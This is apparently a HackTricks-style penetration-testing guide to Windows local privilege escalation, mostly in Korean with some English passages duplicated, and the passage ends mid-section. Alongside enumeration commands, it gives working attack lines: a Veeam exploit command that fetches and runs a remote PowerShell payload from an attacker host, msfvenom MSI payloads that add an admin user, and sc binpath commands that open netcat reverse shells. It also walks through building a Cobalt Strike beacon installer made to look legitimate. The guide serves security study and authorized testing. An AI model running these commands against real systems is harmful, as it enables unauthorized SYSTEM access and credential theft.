# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors를 찾기 위한 최고의 도구:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## 초기 Windows 이론

### Access Tokens

**Windows Access Tokens가 무엇인지 모른다면, 계속하기 전에 다음 페이지를 읽으세요:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs에 대한 자세한 정보는 다음 페이지를 확인하세요:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows의 integrity levels가 무엇인지 모르면, 계속하기 전에 다음 페이지를 읽어야 합니다:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows 보안 컨트롤

Windows에는 시스템을 **열거하는 것을 방해**하거나, 실행 파일 실행을 막거나, 심지어 **활동을 감지**할 수 있는 다양한 요소가 있습니다. privilege escalation 열거를 시작하기 전에 다음 **페이지**를 **읽고** 이러한 모든 **방어 메커니즘**을 **열거**해야 합니다:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

AppInfo secure-path 검사가 우회될 경우 `RAiLaunchAdminProcess`를 통해 시작된 UIAccess 프로세스를 악용하여 프롬프트 없이 High IL에 도달할 수 있습니다. 전용 UIAccess/Admin Protection 우회 워크플로우는 다음에서 확인하세요:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility 레지스트리 전파는 임의의 SYSTEM 레지스트리 쓰기(RegPwn)로 악용될 수 있습니다:

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

## System Info

### Version info enumeration

Windows 버전에 알려진 취약점이 있는지 확인하세요(적용된 패치도 확인하세요).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

This [site](https://msrc.microsoft.com/update-guide/vulnerability) 은 Microsoft 보안 취약점에 대한 자세한 정보를 검색하는 데 유용합니다.  
이 데이터베이스에는 4,700개 이상의 보안 취약점이 등록되어 있으며, Windows 환경이 제공하는 **massive attack surface** 를 보여줍니다.

**시스템에서**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**시스템 정보로 로컬에서**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

### Github repos of exploits:

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 환경

환경 변수에 자격 증명/민감한 정보가 저장되어 있나요?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell 기록
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript 파일

이를 활성화하는 방법은 [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)에서 확인할 수 있습니다.
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell 파이프라인 실행의 세부 사항이 기록되며, 실행된 명령, 명령 호출 및 스크립트의 일부가 포함됩니다. 다만 전체 실행 세부 정보와 출력 결과는 모두 캡처되지 않을 수 있습니다.

이를 활성화하려면 문서의 "Transcript files" 섹션에 있는 지침을 따르되, **"Module Logging"**을 **"Powershell Transcription"** 대신 선택하세요.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell 로그의 마지막 15개 이벤트를 보려면 다음을 실행할 수 있습니다:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

script의 execution에 대한 전체 활동 및 전체 내용 기록이 캡처되어, 실행되는 모든 block of code가 실행되는 동안 문서화되도록 보장합니다. 이 프로세스는 각 활동의 포괄적인 audit trail을 보존하여 forensics 및 악성 행위 분석에 유용합니다. 실행 시점에 모든 활동을 문서화함으로써 프로세스에 대한 상세한 인사이트를 제공합니다.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block의 로깅 이벤트는 Windows Event Viewer의 다음 경로에서 찾을 수 있습니다: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
마지막 20개의 이벤트를 보려면 다음을 사용할 수 있습니다:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### 인터넷 설정
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### 드라이브
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

업데이트 요청이 http**S**가 아니라 http로 이루어질 경우 시스템을 침해할 수 있습니다.

네트워크가 non-SSL WSUS 업데이트를 사용하는지 확인하려면 cmd에서 다음을 실행합니다:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
또는 PowerShell에서 다음을 실행:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
다음과 같은 응답을 받는 경우:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

그리고 `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` 또는 `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` 값이 `1`이라면.

Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

그렇다면, **it is exploitable.** 마지막 레지스트리 값이 `0`이면 WSUS 항목은 무시됩니다.

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

이 취약점을 악용하기 위해 다음과 같은 도구를 사용할 수 있습니다: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS](https://github.com/GoSecure/pywsus) — 이들은 MiTM로 무장된 exploit 스크립트로 non-SSL WSUS 트래픽에 'fake' 업데이트를 주입합니다.

Read the research here:

연구는 다음에서 확인하세요:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:

[**Read the complete report here**]는 변경하지 않았습니다.  
기본적으로, 이 버그가 악용하는 결함은 다음과 같습니다:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

> 로컬 사용자 프록시를 수정할 수 있는 권한이 있고 Windows Updates가 Internet Explorer 설정에 구성된 프록시를 사용한다면, 로컬에서 [PyWSUS](https://github.com/GoSecure/pywsus)를 실행하여 자체 트래픽을 가로채고 에셋에서 승격된 사용자로서 코드를 실행할 수 있는 권한을 갖게 됩니다.
>
> 또한 WSUS 서비스가 현재 사용자의 설정을 사용하므로 현재 사용자의 인증서 저장소도 사용합니다. WSUS 호스트명에 대한 self-signed 인증서를 생성하고 이를 현재 사용자의 인증서 저장소에 추가하면 HTTP 및 HTTPS WSUS 트래픽을 모두 가로챌 수 있습니다. WSUS는 인증서에 대해 trust-on-first-use 유형의 검증을 구현하는 HSTS 유사 메커니즘을 사용하지 않습니다. 제시된 인증서가 사용자에 의해 신뢰되고 올바른 호스트명을 가지면 서비스는 이를 수락합니다.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

이 취약점은 도구 [**WSUSpicious**](https://github.com/GoSecure/wsuspicious)를 사용해 악용할 수 있습니다(공개되면).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Many enterprise agents expose a localhost IPC surface and a privileged update channel. If enrollment can be coerced to an attacker server and the updater trusts a rogue root CA or weak signer checks, a local user can deliver a malicious MSI that the SYSTEM service installs. See a generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) here:

많은 엔터프라이즈 에이전트는 localhost IPC 인터페이스와 권한 있는 업데이트 채널을 노출합니다. 등록(enrollment)이 공격자 서버로 강제될 수 있고 updater가 rogue root CA 또는 약한 서명 검증을 신뢰하면, 로컬 사용자는 SYSTEM 서비스가 설치하는 악성 MSI를 전달할 수 있습니다. 일반화된 기법(기반: Netskope stAgentSvc 체인 – CVE-2025-0309)은 다음을 참조하세요:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` exposes a localhost service on **TCP/9401** that processes attacker-controlled messages, allowing arbitrary commands as **NT AUTHORITY\SYSTEM**.

Veeam B&R < `11.0.1.1261` 은 공격자가 제어하는 메시지를 처리하는 localhost 서비스를 **TCP/9401**에서 노출하며, 이를 통해 임의의 명령을 **NT AUTHORITY\SYSTEM** 권한으로 실행할 수 있습니다.

- **Recon**: confirm the listener and version, e.g., `netstat -ano | findstr 9401` and `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

- **Recon**: 리스너와 버전을 확인하세요. 예: `netstat -ano | findstr 9401` 및 `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

- **Exploit**: place a PoC such as `VeeamHax.exe` with the required Veeam DLLs in the same directory, then trigger a SYSTEM payload over the local socket:

- **Exploit**: `VeeamHax.exe` 같은 PoC와 필요한 Veeam DLL들을 동일 디렉터리에 배치한 다음 로컬 소켓을 통해 SYSTEM 페이로드를 트리거하세요:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
서비스는 명령을 SYSTEM 권한으로 실행합니다.

## KrbRelayUp

특정 조건에서 Windows **domain** 환경에 **local privilege escalation** 취약점이 존재합니다. 이러한 조건에는 **LDAP signing**이 강제되지 않는 환경, 사용자가 **Resource-Based Constrained Delegation (RBCD)**을 구성할 수 있는 권한(self-rights)을 보유한 경우, 그리고 사용자가 도메인 내에서 컴퓨터를 생성할 수 있는 권한이 있는 경우가 포함됩니다. 이러한 **요구사항**은 **기본 설정**으로 충족된다는 점을 유의해야 합니다.

Find the **exploit in** [https://github.com/Dec0ne/KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**만약** 이 2개의 레지스트리 항목이 **활성화**되어 있다면(값이 **0x1**), 모든 권한의 사용자는 `*.msi` 파일을 NT AUTHORITY\\**SYSTEM** 권한으로 **설치(실행)**할 수 있습니다.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

power-up의 `Write-UserAddMSI` 명령을 사용하면 현재 디렉터리에 권한 상승용 Windows MSI 바이너리를 생성할 수 있습니다. 이 스크립트는 사용자/그룹 추가를 요청하는 사전 컴파일된 MSI 인스톨러를 출력합니다(따라서 GIU 접근이 필요합니다):
```
Write-UserAddMSI
```
생성된 바이너리를 실행하여 권한을 상승시키기만 하면 됩니다.

### MSI Wrapper

Read this tutorial to learn how to create a MSI wrapper using this tools. Note that you can wrap a "**.bat**" file if you **just** want to **execute** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Open **Visual Studio**, select **Create a new project** and type "installer" into the search box. Select the **Setup Wizard** project and click **Next**.
- Give the project a name, like **AlwaysPrivesc**, use **`C:\privesc`** for the location, select **place solution and project in the same directory**, and click **Create**.
- Keep clicking **Next** until you get to step 3 of 4 (choose files to include). Click **Add** and select the Beacon payload you just generated. Then click **Finish**.
- Highlight the **AlwaysPrivesc** project in the **Solution Explorer** and in the **Properties**, change **TargetPlatform** from **x86** to **x64**.
- There are other properties you can change, such as the **Author** and **Manufacturer** which can make the installed app look more legitimate.
- Right-click the project and select **View > Custom Actions**.
- Right-click **Install** and select **Add Custom Action**.
- Double-click on **Application Folder**, select your **beacon.exe** file and click **OK**. This will ensure that the beacon payload is executed as soon as the installer is run.
- Under the **Custom Action Properties**, change **Run64Bit** to **True**.
- Finally, **build it**.
- If the warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` is shown, make sure you set the platform to x64.

### MSI Installation

악성 `.msi` 파일의 **설치**를 **백그라운드**에서 실행하려면:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
이 취약점을 악용하려면 다음을 사용할 수 있습니다: _exploit/windows/local/always_install_elevated_

## 안티바이러스 및 탐지기

### 감사 설정

이 설정들은 무엇이 **기록**되는지를 결정하므로 주의해야 합니다
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding은 로그가 어디로 전송되는지 알아보는 것이 흥미롭다
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS**는 도메인에 가입된 컴퓨터에서 로컬 Administrator 비밀번호를 관리하도록 설계되었으며, 각 비밀번호가 **고유하고 무작위로 생성되며 정기적으로 갱신**되도록 보장합니다. 이러한 비밀번호는 Active Directory에 안전하게 저장되며, ACLs를 통해 충분한 권한이 부여된 사용자만 접근하여 승인된 경우 로컬 Administrator 비밀번호를 볼 수 있습니다.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

활성화되어 있으면, **평문 비밀번호가 LSASS에 저장됩니다** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1**부터 Microsoft는 Local Security Authority (LSA)에 대한 향상된 보호를 도입하여 신뢰되지 않은 프로세스가 그 메모리를 **읽으려는** 시도나 코드를 주입하려는 시도를 **차단**함으로써 시스템 보안을 강화했습니다.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard**은 **Windows 10**에 도입되었습니다. 그 목적은 장치에 저장된 credentials을 pass-the-hash 공격과 같은 위협으로부터 보호하는 것입니다.| [**Credentials Guard에 대한 자세한 정보는 여기에서 확인하세요.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials**는 **Local Security Authority** (LSA)에 의해 인증되며 운영 체제 구성 요소에서 사용됩니다. 사용자의 로그온 데이터가 등록된 보안 패키지에 의해 인증되면, 일반적으로 해당 사용자에 대한 domain credentials가 생성됩니다.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## 사용자 및 그룹

### 사용자 및 그룹 열거

자신이 속한 그룹 중 흥미로운 권한이 있는지 확인하세요.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 특권 그룹

**어떤 특권 그룹에 속해 있다면 권한 상승이 가능할 수 있습니다**. 여기에서 특권 그룹과 이를 악용해 권한을 상승시키는 방법을 알아보세요:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### 토큰 조작

이 페이지에서 **token**이 무엇인지 **자세히 알아보세요**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
다음 페이지에서 **흥미로운 tokens에 대해 알아보고 이를 악용하는 방법**을 확인하세요:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### 로그온된 사용자 / 세션
```bash
qwinsta
klist sessions
```
### 홈 폴더
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### 암호 정책
```bash
net accounts
```
### 클립보드 내용 가져오기
```bash
powershell -command "Get-Clipboard"
```
## 실행 중인 프로세스

### 파일 및 폴더 권한

무엇보다도, 프로세스를 나열할 때 **프로세스의 명령줄에 비밀번호가 포함되어 있는지 확인**.\
실행 중인 일부 **overwrite some binary running**을 덮어쓸 수 있는지, 또는 binary 폴더에 대한 write permissions가 있어 [**DLL Hijacking attacks**](dll-hijacking/index.html)를 악용할 수 있는지 확인하세요:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
항상 가능한 [**electron/cef/chromium debuggers** 실행 중인지 확인하세요, 이를 악용하여 escalate privileges 할 수 있습니다](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**프로세스 바이너리의 권한 확인**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**프로세스 바이너리 폴더의 권한 확인 (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

실행 중인 프로세스의 메모리 덤프는 sysinternals의 **procdump**로 생성할 수 있습니다. FTP와 같은 서비스는 메모리에 **credentials in clear text in memory**가 존재하는 경우가 있으니, 메모리를 덤프하여 해당 credentials를 읽어보세요.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 취약한 GUI 앱

**SYSTEM으로 실행되는 애플리케이션은 사용자가 CMD를 실행하거나 디렉터리를 탐색할 수 있게 허용할 수 있습니다.**

예: "Windows Help and Support" (Windows + F1)에서 "command prompt"를 검색하고 "Click to open Command Prompt"를 클릭하세요.

## Services

Service Triggers는 특정 조건(named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh 등)이 발생할 때 Windows가 서비스를 시작하도록 합니다. SERVICE_START 권한이 없어도 트리거를 발동시켜 권한이 있는 서비스를 시작할 수 있는 경우가 많습니다. 열거 및 활성화 기법은 다음에서 확인하세요:

-
{{#ref}}
service-triggers.md
{{#endref}}

서비스 목록을 가져오기:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 권한

서비스의 정보를 얻으려면 **sc**를 사용할 수 있습니다
```bash
sc qc <service_name>
```
각 서비스에 필요한 권한 수준을 확인하려면 _Sysinternals_에서 제공하는 바이너리 **accesschk**를 사용하는 것이 권장됩니다.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users"가 어떤 서비스를 수정할 수 있는지 확인하는 것이 권장됩니다:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### 서비스 활성화

다음과 같은 오류가 발생하는 경우(예: SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

다음 명령으로 활성화할 수 있습니다
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**서비스 upnphost는 작동하려면 SSDPSRV에 의존한다는 점을 고려하세요 (XP SP1의 경우)**

**이 문제의 또 다른 우회 방법은 다음을 실행하는 것입니다:**
```
sc.exe config usosvc start= auto
```
### **서비스 바이너리 경로 수정**

서비스에 대해 "Authenticated users" 그룹이 **SERVICE_ALL_ACCESS** 권한을 가진 경우, 서비스의 실행 파일을 수정할 수 있습니다. 서비스를 수정하고 실행하려면 **sc**를 사용합니다:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### 서비스 재시작
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
권한 상승은 다음과 같은 권한들을 통해 이뤄질 수 있습니다:

- **SERVICE_CHANGE_CONFIG**: 서비스 바이너리를 재구성할 수 있습니다.
- **WRITE_DAC**: 권한 재구성을 가능하게 하여 서비스 구성을 변경할 수 있게 합니다.
- **WRITE_OWNER**: 소유권 획득 및 권한 재구성을 허용합니다.
- **GENERIC_WRITE**: 서비스 구성 변경 권한을 포함합니다.
- **GENERIC_ALL**: 마찬가지로 서비스 구성 변경 권한을 포함합니다.

이 취약점의 탐지 및 악용에는 _exploit/windows/local/service_permissions_를 사용할 수 있습니다.

### Services binaries weak permissions

**서비스에서 실행되는 바이너리를 수정할 수 있는지 확인하세요** 또는 바이너리가 위치한 폴더에 **쓰기 권한이 있는지** 확인하세요 ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
서비스에서 실행되는 모든 바이너리는 **wmic**을 사용해 확인할 수 있습니다 (system32에 있지 않은 경로) 그리고 **icacls**로 권한을 확인하세요:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
또한 **sc** 및 **icacls**를 사용할 수 있습니다:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Services registry 수정 권한

서비스를 수정할 수 있는지 확인해야 합니다.\
다음과 같이 서비스 **registry**에 대한 **권한**을 **확인**할 수 있습니다:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
서비스가 실행하는 바이너리를 변경할 수 있으므로 **Authenticated Users** 또는 **NT AUTHORITY\INTERACTIVE**가 `FullControl` 권한을 가지고 있는지 확인해야 합니다.

실행되는 바이너리의 Path를 변경하려면:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

일부 Windows Accessibility 기능은 사용자별 **ATConfig** 키를 생성하며, 이 키는 나중에 **SYSTEM** 프로세스에 의해 HKLM 세션 키로 복사됩니다. 레지스트리의 **symbolic link race**는 그 권한 있는 쓰기를 **any HKLM path**로 리디렉션하여 임의의 HKLM **value write** primitive를 제공합니다.

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` 은 설치된 접근성 기능을 나열합니다.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` 는 사용자가 제어하는 구성을 저장합니다.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` 는 로그온/secure-desktop 전환 중에 생성되며 사용자가 쓸 수 있습니다.

Abuse flow (CVE-2026-24291 / ATConfig):

1. SYSTEM에 의해 기록되기를 원하는 **HKCU ATConfig** 값을 채웁니다.
2. secure-desktop 복사(예: **LockWorkstation**)를 트리거하여 AT broker 흐름을 시작합니다.
